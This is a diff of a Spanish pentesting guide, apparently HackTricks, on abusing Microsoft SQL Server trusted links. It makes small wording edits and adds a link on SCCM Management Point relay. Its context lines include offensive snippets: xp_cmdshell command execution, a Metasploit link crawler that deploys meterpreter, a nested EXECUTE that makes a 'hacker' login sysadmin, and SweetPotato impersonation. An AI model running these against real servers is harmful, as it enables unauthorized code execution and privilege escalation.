@@ -166,7 +166,7 @@ También podría ser posible **ejecutar comandos** dentro del host de MSSQL.
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Revisa en la página mencionada en la **siguiente sección cómo hacer esto manualmente.**
+Revisa en la página mencionada en la **siguiente sección cómo hacerlo manualmente.**
 
 ### Trucos Básicos de Hacking en MSSQL
 
@@ -176,7 +176,7 @@ Revisa en la página mencionada en la **siguiente sección cómo hacer esto manu
 
 ## Enlaces de Confianza en MSSQL
 
-Si una instancia de MSSQL es de confianza (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría ser capaz de encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
+Si una instancia de MSSQL es de confianza (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
 
 **Los enlaces entre bases de datos funcionan incluso a través de confianzas de bosque.**
 
@@ -220,13 +220,13 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza usando metasploit.
+Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
+Notice que metasploit intentará abusar solo de la función `openquery()` en MSSQL (así que, si no puedes ejecutar comandos con `openquery()`, necesitarás intentar el método `EXECUTE` **manualmente** para ejecutar comandos, ver más abajo.)
 
 ### Manual - Openquery()
 
@@ -234,7 +234,7 @@ Desde **Linux** podrías obtener un shell de consola MSSQL con **sqsh** y **mssq
 
 Desde **Windows** también podrías encontrar los enlaces y ejecutar comandos manualmente usando un **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
 
-_Iniciar sesión usando autenticación de Windows:_
+_Inicia sesión usando autenticación de Windows:_
 
 ![](<../../images/image (808).png>)
 
@@ -278,9 +278,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 El **usuario local de MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "imite a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han propuesto es forzar a un servicio del SYSTEM a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SYSTEM mientras intenta autenticarse.
+Una estrategia que muchos autores han propuesto es forzar a un servicio del SISTEMA a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SISTEMA mientras intenta autenticarse.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que se pueden ejecutar a través del comando `execute-assembly` de Beacon.
 
+
+
+### Relevo NTLM del Punto de Gestión SCCM (Extracción de Secretos OSD)
+Vea cómo los roles SQL predeterminados de **Puntos de Gestión** de SCCM pueden ser abusados para volcar la Cuenta de Acceso a la Red y secretos de Secuencia de Tareas directamente desde la base de datos del sitio:
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
